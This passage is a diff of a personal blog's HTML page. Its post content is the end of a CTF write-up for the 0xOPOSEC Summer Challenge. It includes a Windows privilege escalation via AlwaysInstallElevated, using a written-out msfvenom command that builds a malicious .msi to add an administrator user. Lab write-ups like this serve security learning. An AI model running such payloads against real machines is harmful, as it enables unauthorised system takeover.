+<p><img src="https://user-images.githubusercontent.com/12052283/186481520-196af136-c182-4d89-af6d-4cc50a97989b.png" alt="image"></p>
 <ul>
 <li>
 <p>I searched for this binary on google and I found nothing so I assume that this was a crafted binary to this challenge</p>
@@ -535,20 +709,22 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>Running the binary gave me the following output</p>
 </li>
 </ul>
-<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186482121-d0393300-bf8b-401b-89e8-2f9ccf777cd7.png"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/186482121-d0393300-bf8b-401b-89e8-2f9ccf777cd7.png" alt="image"></p>
 <ul>
 <li>Unfortunately I was stuck for a long time on this challenge trying to break it without success so I wasn&rsquo;t able to get the flag</li>
 </ul>
-<h2 id="second-windows-priv-esc">Second Windows Priv Esc<a hidden class="anchor" aria-hidden="true" href="#second-windows-priv-esc">#</a></h2>
-<h3 id="stairway-to-heaven">Stairway To Heaven<a hidden class="anchor" aria-hidden="true" href="#stairway-to-heaven">#</a></h3>
+<h2 id="second-windows-priv-esc">Second Windows Priv Esc</h2>
+<h3 id="stairway-to-heaven">Stairway To Heaven</h3>
 <p><em>&ldquo;Larapios Group states that they can completely compromise the machine and gain Administrator access through a misconfiguration!&rdquo;</em></p>
 <br>
 <ul>
 <li>
-<p>So I moved to <code>192.168.111.41</code> and after some minutes of enumeration I decided to run <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a></p>
+<p>So I moved to <code>192.168.111.41</code> and after some minutes of enumeration I decided to run <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">winpeas</a>
+</p>
 </li>
 <li>
-<p>winpeas returned an interesting finding, <code>alwaysinstalledelevated</code> was set to 1 so I could <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated">exploit</a> this with a crafted <code>.msi</code> file</p>
+<p>winpeas returned an interesting finding, <code>alwaysinstalledelevated</code> was set to 1 so I could <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" target="_blank">exploit</a>
+ this with a crafted <code>.msi</code> file</p>
 </li>
 <li>
 <p>I setuped a .msi file using <code>msfvenom -p windows/adduser USER=brun0 PASS=n0tSoSecure! -f msi -o alwe.msi</code> and then I uploaded that .msi file to <code>192.168.111.41</code></p>
@@ -560,92 +736,343 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <p>Next I did a rdp connection with the new user created to the target machine and I was able to get the Administrator flag in <code>C:\Users\Administrator\Desktop</code></p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>wholeLegInTheEnterprise<span style="color:#719e07">}</span>
-</span></span></code></pre></div><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>wholeLegInTheEnterprise<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>This was my come back to 0XOPOSEC Summer Challenge (last I did was in 2019) and to be fair I realy liked It because It was more realistic as we could exploit linux machines and windows machines and jump from one to another.
 A recommendation for the next one would be to have a more defined path because there was an handful of achines and the challenges asked for a flag but we had to find what machine should we exploit to get the flag to that specific challenge.
 Other than that was a realy fun one so next is the Christmas challenge!</p>
 
 
+        
+      </section>
+
+      
+      <div class="divider"></div>
+      <div class="flex flex-col md:flex-row justify-between gap-4 py-4">
+        
+        <a role="button" class="btn btn-outline h-12" href="/posts/2022-01-01-loadbalancing-on-webservers-with-haproxy-and-keepalived/" title="Load Balancing On Webservers with HAProxy and KeepAlived">
+          <ion-icon name="chevron-back"></ion-icon>
+          <div class="inline-flex flex-col items-start">
+            <span class="text-base-content/60 text-xs font-normal">Previous page</span>
+            <span class="max-w-48 truncate">Load Balancing On Webservers with HAProxy and KeepAlived</span>
+          </div>
+        </a>
+        
+
+        
+        <a role="button" class="btn btn-outline h-12" href="/posts/2022-02-24-0xoposec/" title="0xOPOSEC 24/02/2022 Challenge">
+          <div class="inline-flex flex-col items-end">
+            <span class="text-base-content/60 text-xs font-normal">Next page</span>
+            <span class="max-w-48 truncate">0xOPOSEC 24/02/2022 Challenge</span>
+          </div>
+          <ion-icon name="chevron-forward"></ion-icon>
+        </a>
+        
+      </div>
+      
+
+      
+    </article>
   </div>
 
-  <footer class="post-footer">
-    <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/ctf/">CTF</a></li>
-    </ul>
-  </footer>
-</article>
-    </main>
+  <div
+    x-data="tocHighlighter()"
+    @scroll.window="debouncedScroll"
+    class="hidden lg:flex lg:flex-col lg:items-end">
     
-<footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Bruno Blog</a></span> · 
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#first-recon">First recon</a>
+      <ul>
+        <li><a href="#larapios-group-access">Larapios Group Access</a></li>
+      </ul>
+    </li>
+    <li><a href="#second-recon">Second recon</a>
+      <ul>
+        <li><a href="#spread-your-hacks">Spread Your Hacks</a></li>
+      </ul>
+    </li>
+    <li><a href="#first-windows-priv-esc">First Windows Priv Esc</a>
+      <ul>
+        <li><a href="#big-dollar-spender">Big Dollar Spender</a></li>
+      </ul>
+    </li>
+    <li><a href="#third-recon">Third recon</a>
+      <ul>
+        <li><a href="#other-os-are-people-2">Other Os Are People 2</a></li>
+      </ul>
+    </li>
+    <li><a href="#first-linux-priv-esc">First Linux Priv Esc</a>
+      <ul>
+        <li><a href="#captain-pwn">CAPtain Pwn!</a></li>
+      </ul>
+    </li>
+    <li><a href="#second-linux-priv-esc">Second Linux Priv Esc</a>
+      <ul>
+        <li><a href="#so-cute">SO Cute!</a></li>
+      </ul>
+    </li>
+    <li><a href="#second-windows-priv-esc">Second Windows Priv Esc</a>
+      <ul>
+        <li><a href="#stairway-to-heaven">Stairway To Heaven</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    
+  </div>
+</div>
 
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
+
+            
+<footer class="flex justify-between items-center gap-2 max-w-[65ch] mx-auto px-4 md:px-0 py-12">
+
+  <div>
+  
+  <p>
+    © 2018 - 2025 Bruno Blog
+  </p>
+  
+
+  
+  <p class="text-sm">
+    🌱
+    <span class="text-base-content/60">
+      Powered by <a class="hover:underline" href="https://gohugo.io/" target="_blank">Hugo</a> with theme
+      <a class="hover:underline" href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</span
+    >
+  </p>
+  
+</div>
+
+  <div
+  x-data="{ icons: [
+    { name: 'sunny', status: 'n' },
+    { name: 'moon', status: 'y' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center gap-2 h-[32px] px-2 bg-base-100 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
+    </div>
+  </template>
+</div>
+
 </footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
 
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
+          </div>
+        </div>
+        <div class="back">
+          <div class="container">
+            
+            <div class="max-w-[65ch] mt-8 mx-auto px-4">
+  
+  
+  
+  <div>
+    <div class="mb-4 text-lg font-medium"></div>
 
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
+    <div class="prose dark:prose-invert">
+      <h1 id="about-me">About me</h1>
+<p><em>My name is Bruno Teixeira and I am an Offensive Cyber Security Analyst. Focused on learning Information Security and Systems Administration. Always doing some side projects to improve my coding skills and learn new technologies on the way.</em></p>
+<h2 id="work-experience">Work Experience</h2>
+<ul>
+<li>Pentester @ <a href="https://www.pt.logicalis.com/pt-pt" target="_blank">Logicalis PT</a>
+ (Current)</li>
+<li>Pentester @ <a href="https://www.layer8.pt" target="_blank">Layer8</a>
+</li>
+<li>Offensive Cyber Security Analyst @ <a href="https://artresilia.com/" target="_blank">ArtResilia</a>
+</li>
+<li>Technical Support / Service Desk @ <a href="https://www.cgi.com/en" target="_blank">CGI</a>
+</li>
+<li>Military @ <a href="https://www.exercito.pt/pt" target="_blank">Exército Português</a>
+</li>
+</ul>
+<h2 id="education">Education</h2>
+<ul>
+<li>BsC Computer Engineering @ <a href="https://www.isec.pt" target="_blank">ISEC Coimbra</a>
+</li>
+<li>CET Network and Systems @ <a href="https://www.cinel.pt" target="_blank">CINEL Porto</a>
+</li>
+<li>IT &amp; Programming @ <a href="https://eisnt.com/" target="_blank">EISnt, High School</a>
+</li>
+</ul>
+<h2 id="work-experience-as-a-trainee">Work Experience as a Trainee</h2>
+<ul>
+<li>IT and Network department @ <a href="https://www.islagaia.pt/pt/" target="_blank">ISLA Gaia</a>
+</li>
+<li>Hardware &amp; Software Maintenance @ <a href="http://assistencia35.com/" target="_blank">Assistência 35 LDA</a>
+</li>
+<li>Hardware Maintenance @ <a href="https://www.lojasehorarios.com.pt/dotcenter-informatica-soc-unip-lda/porto/c-58637a1332cff589d8187aa3" target="_blank">DOTcenter</a>
+</li>
+</ul>
 
+    </div>
+  </div>
+  <div class="divider divider-vertical"></div>
+  
+  
+
+  
+  
+  <div class="pb-4">
+  
+    <div class="mb-4 text-lg font-medium">Social Links</div>
+
+    <ul class="menu menu-horizontal flex-wrap w-full px-0 [&_ion-icon]:text-lg">
+  
+  <li>
+    <a href="mailto:brunoalexandre3@hotmail.com" title="Email">
+      <ion-icon name="mail"></ion-icon>
+    </a>
+  </li>
+  
+
+  
+  <li>
+    <a href="https://github.com/BrunoTeixeira1996" target="_blank" title="GitHub">
+      <ion-icon name="logo-github"></ion-icon>
+    </a>
+  </li>
+  
+  <li>
+    <a href="https://x.com/zebisnaga3" target="_blank" title="X">
+      <ion-icon name="logo-x"></ion-icon>
+    </a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/bruno-teixeira-1553b4a1/" target="_blank" title="Linkedin">
+      <ion-icon name="logo-linkedin"></ion-icon>
+    </a>
+  </li>
+  
+</ul>
+
+  </div>
+  
+
+  
+</div>
+
+            
+
+            
+<footer class="flex justify-between items-center gap-2 max-w-[65ch] mx-auto px-4 md:px-0 py-12">
+
+  <div>
+  
+  <p>
+    © 2018 - 2025 Bruno Blog
+  </p>
+  
+
+  
+  <p class="text-sm">
+    🌱
+    <span class="text-base-content/60">
+      Powered by <a class="hover:underline" href="https://gohugo.io/" target="_blank">Hugo</a> with theme
+      <a class="hover:underline" href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</span
+    >
+  </p>
+  
+</div>
+
+  <div
+  x-data="{ icons: [
+    { name: 'sunny', status: 'n' },
+    { name: 'moon', status: 'y' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center gap-2 h-[32px] px-2 bg-base-100 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
+    </div>
+  </template>
+</div>
+
+</footer>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+  window.lightTheme = "emerald"
+  window.darkTheme = "forest"
 </script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
 
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
 
-</script>
-</body>
 
+
+
+<script src="/js/main.js"></script>
+
+    
+
+
+
+
+
+
+
+<script src="/js/toc.js"></script>
+
+
+  
+    <script type="module">
+      import mediumZoom from 'https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/+esm';
+      mediumZoom('#dream-single-post-content img', {
+        background: 'oklch(var(--b1))',
+        margin: 24,
+      })
+    </script>
+  
+
+
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+    <script type="module" src="https://cdn.jsdelivr.net/npm/ionicons@7.4.0/dist/ionicons/ionicons.esm.js" integrity="sha256-/IFmi82bIhdYWctu0UddSlJqpnzWm7Vh2C4CM32wF/k=" crossorigin="anonymous"></script>
+    <script nomodule src="https://cdn.jsdelivr.net/npm/ionicons@7.4.0/dist/ionicons/ionicons.js" integrity="sha256-mr7eJMX3VC3F7G32mk4oWp1C6a2tlMYxUdptfT7uKI8=" crossorigin="anonymous"></script>
+  </body>
 </html>
